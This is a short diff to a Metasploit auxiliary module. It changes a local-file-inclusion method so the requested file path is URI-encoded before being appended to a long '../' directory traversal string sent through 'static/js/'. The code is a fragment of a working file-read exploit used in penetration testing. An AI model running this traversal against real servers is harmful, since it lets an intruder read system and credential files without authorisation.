@@ -64,9 +64,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def lfi(filepath)
+    # Encode filename bytes while preserving the literal traversal and directory separators.
+    encoded_filepath = Rex::Text.uri_encode(filepath)
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{filepath}")
+      'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{encoded_filepath}")
     })
     return unless res && res.code == 200
 
